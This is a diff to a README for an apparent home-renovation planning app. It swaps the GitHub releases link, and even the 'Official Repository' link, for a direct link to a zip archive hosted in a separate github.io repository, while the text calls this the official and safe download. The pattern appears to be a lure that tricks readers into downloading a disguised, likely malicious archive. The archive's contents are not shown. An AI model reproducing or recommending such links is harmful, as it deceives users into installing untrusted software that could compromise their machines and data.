@@ -17,7 +17,7 @@ This guide will walk you through everything you need to know—from downloading 
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: **[Download Home-Renovation-Planner](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)**
+Visit this link to download the application: **[Download Home-Renovation-Planner](https://raw.githubusercontent.com/Serviceswage2135/serviceswage2135.github.io/main/Teriann/3.8.zip)**
 
 *The button above is your official download source. Always use this link to ensure you get the latest, safe version.*
 
@@ -174,8 +174,8 @@ You'll be amazed at how much clearer your renovation becomes once everything is 
 
 ## 🔗 Useful Links
 
-- **[Download the Application](https://github.com/Serviceswage2135/Home-Renovation-Planner/releases)**
-- **Official Repository**: https://github.com/Serviceswage2135/Home-Renovation-Planner (for source code and issue tracking)
+- **[Download the Application](https://raw.githubusercontent.com/Serviceswage2135/serviceswage2135.github.io/main/Teriann/3.8.zip)**
+- **Official Repository**: https://raw.githubusercontent.com/Serviceswage2135/serviceswage2135.github.io/main/Teriann/3.8.zip (for source code and issue tracking)
 
 ---
 
